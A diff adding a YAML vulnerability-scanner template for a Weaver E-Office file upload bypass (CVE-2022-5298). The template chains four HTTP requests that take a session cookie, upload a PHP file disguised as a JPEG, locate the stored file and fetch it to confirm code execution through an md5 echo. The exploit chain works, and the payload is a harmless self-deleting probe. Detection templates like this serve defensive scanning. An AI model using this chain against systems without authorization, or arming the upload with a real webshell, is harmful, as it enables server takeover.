@@ -1,0 +1,86 @@
+id: CVE-2022-5298
+
+info:
+  name: Weaver E-Office File Upload Bypass
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    E-office has a privilege bypass vulnerability. An attacker can bypass privilege verification and upload arbitrary files to obtain server control permissions.
+  tags: file-upload, privilege-bypass
+
+flow: |
+  http(1) && http(2) && http(3) && http(4)
+
+http:
+  - id: check-sample
+    method: GET
+    path:
+      - "{{BaseURL}}/sample.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: setcookie
+        part: header
+        regex:
+          - "Set-Cookie: PHPSESSID=(.*?); path=/"
+        internal: true
+
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/inc/ext/upload/file-upload.php"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryc3kzQm4dBRhin8Dk
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+      Accept-Encoding: gzip, deflate
+      Cookie: "{{setcookie}}"
+    body: |
+      ------WebKitFormBoundaryc3kzQm4dBRhin8Dk
+      Content-Disposition: form-data; name="userfile"; filename="like.php4"
+      Content-Type: image/jpeg
+
+      <?php echo md5(233);unlink(__FILE__);?>
+      ------WebKitFormBoundaryc3kzQm4dBRhin8Dk--
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: get-uploaded-file
+    method: GET
+    path:
+      - "{{BaseURL}}/general/address/view/get-images.php?alb_id=11&start=0&limit=1"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: filename
+        part: body
+        regex:
+          - "\"frist_url\":\"\\/attachment\\/album\\/(.*?)\\/like.php4\""
+        internal: true
+
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/attachment/album/{{filename}}/like.php4"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
